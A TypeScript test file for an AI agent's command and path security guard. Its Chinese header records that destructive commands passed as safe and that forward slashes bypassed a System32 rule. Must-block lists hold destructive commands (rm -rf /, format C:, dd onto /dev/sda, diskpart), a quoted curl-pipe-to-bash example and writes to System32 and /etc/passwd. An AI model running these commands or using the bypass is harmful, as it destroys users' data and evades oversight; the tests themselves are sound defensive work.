// ============================================================
// securityGuardDestructive.test.ts — 毁灭性命令与路径分隔符绕过（2026-10-07）
//
// 【怎么发现的】实测 Lumina agent 时顺手扫了一遍安全护栏，发现两件事：
//
//   ① `rm -rf /`、`format C:`、`del /f /s /q C:\` 全部返回 severity=SAFE **放行**。
//      而护栏当时能拦住的是 `curl http://x.sh | bash` 这类**注入型**命令 ——
//      也就是说：**防住了「外部塞进来的命令」，却没防住「模型自己写出来的
//      毁灭性命令」**。对会自主执行命令的桌宠 Agent，后者才是更现实的威胁面。
//
//   ② `PATH-001` 的正则写作 /C:\\Windows\\System32|…/i，**只认反斜杠**。
//      但 Windows 的 API 与 shell 同时接受正斜杠 ——
//      `C:/Windows/System32/evil.dll` 直接绕过护栏（实测 SAFE 放行）。
//
// 【本文件守两条线】
//   · 毁灭性命令必须被拦（且**不能误伤**日常开发命令 —— 见 MUST_PASS）
//   · 系统目录路径必须两种分隔符都拦
// ============================================================

import { describe, it, expect, beforeAll } from 'vitest'
import { initSecurityGuard } from '../electron/securityGuard'

let guard: ReturnType<typeof initSecurityGuard>

const check = (name: string, args: Record<string, any>) =>
  guard.checkToolCall({ id: '', type: 'function', function: { name, arguments: JSON.stringify(args) } })

const checkCmd = (command: string) => check('shell_exec', { command })

describe('毁灭性命令必须被拦（不可逆操作）', () => {
  beforeAll(() => { guard = initSecurityGuard({ enabled: true, blockCritical: true, requireApprovalForHigh: true }) })

  const MUST_BLOCK: Array<[string, string]> = [
    ['rm -rf /', '根目录'],
    ['rm -rf /*', '根目录通配'],
    ['rm -rf ~', '家目录'],
    ['rm -rf $HOME', '家目录变量'],
    ['sudo rm -rf /', '带 sudo 前缀'],
    ['rm -fr /', '参数反序'],
    ['rm -rf C:', '整个盘符'],
    ['del /f /s /q C:\\', 'Windows 递归删除'],
    ['format C:', '格式化'],
    ['mkfs.ext4 /dev/sda1', 'mkfs'],
    ['dd if=/dev/zero of=/dev/sda', 'dd 覆写块设备'],
    ['diskpart', 'diskpart'],
  ]

  it.each(MUST_BLOCK)('拦截：%s（%s）', (cmd) => {
    const r = checkCmd(cmd)
    expect(
      r.allowed,
      `「${cmd}」没有被拦住 —— 这是不可逆的毁灭性操作，必须 CRITICAL 拦截。` +
      `findings=${JSON.stringify(r.findings.map(f => f.ruleId))}`,
    ).toBe(false)
    expect(r.severity).toBe('CRITICAL')
  })

  it('拦截时会给出可读的规则名（不是只给一个 ruleId）', () => {
    const r = checkCmd('rm -rf /')
    expect(r.findings.length).toBeGreaterThan(0)
    expect(r.findings[0].title).toContain('删除')
  })
})

describe('不能误伤日常开发命令（否则护栏会变成噪音）', () => {
  beforeAll(() => { guard = initSecurityGuard({ enabled: true, blockCritical: true, requireApprovalForHigh: true }) })

  // 递归删除子目录是开发日常。把它标成危险 → 用户学会无脑点「同意」→
  // 真实告警被淹没。所以规则只锚定「根 / 家 / 盘符」三种目标。
  const MUST_PASS: Array<[string, string]> = [
    ['echo hello', '普通命令'],
    ['npm run build', '构建'],
    ['npm install', '装依赖'],
    ['git status', 'git 查询'],
    ['ls -la', '列目录'],
    ['rm /tmp/a.txt', '删单个文件'],
    ['rm -rf ./dist', '清构建产物'],
    ['rm -rf node_modules', '清依赖目录'],
    ['rm -rf /tmp/lumina-build', '清临时目录'],
    ['rm -rf ./build/*', '清构建通配'],
    ['find . -name "*.log" -delete', '按规则清理'],
  ]

  it.each(MUST_PASS)('放行：%s（%s）', (cmd) => {
    const r = checkCmd(cmd)
    expect(
      r.allowed && !r.requiresApproval,
      `「${cmd}」被误伤了（allowed=${r.allowed} 需审批=${r.requiresApproval}）——` +
      `这类命令是开发日常，拦住它只会让用户学会忽略告警。` +
      `findings=${JSON.stringify(r.findings.map(f => f.ruleId))}`,
    ).toBe(true)
  })
})

describe('系统目录路径：正反斜杠都要拦（分隔符绕过）', () => {
  beforeAll(() => { guard = initSecurityGuard({ enabled: true, blockCritical: true, requireApprovalForHigh: true }) })

  const SYSTEM_PATHS = [
    'C:\\Windows\\System32\\evil.dll',
    'C:/Windows/System32/evil.dll',
    'c:/windows/system32/x.dll',
    'C:/Windows/SysWOW64/x.dll',
  ]

  it.each(SYSTEM_PATHS)('拦截写入：%s', (p) => {
    const r = check('file_write', { path: p, content: 'x' })
    expect(
      r.allowed,
      `写入「${p}」没被拦住。Windows 的 API 与 shell 都同时接受正斜杠，` +
      `规则若只写反斜杠，攻击者换一个分隔符就能绕过。`,
    ).toBe(false)
  })

  it('正常路径不被误伤', () => {
    for (const p of ['K:/2/ok.txt', 'C:/Users/me/doc.txt', '/home/me/a.txt', 'K:\\2\\ok.txt']) {
      const r = check('file_write', { path: p, content: 'x' })
      expect(r.allowed, `正常路径「${p}」被误伤`).toBe(true)
    }
  })

  it('写入 Unix 系统目录至少要被标为 HIGH（需审批）', () => {
    const r = check('file_write', { path: '/etc/passwd', content: 'x' })
    expect(['HIGH', 'CRITICAL'], `写 /etc 的严重度只有 ${r.severity}`).toContain(r.severity)
  })
})
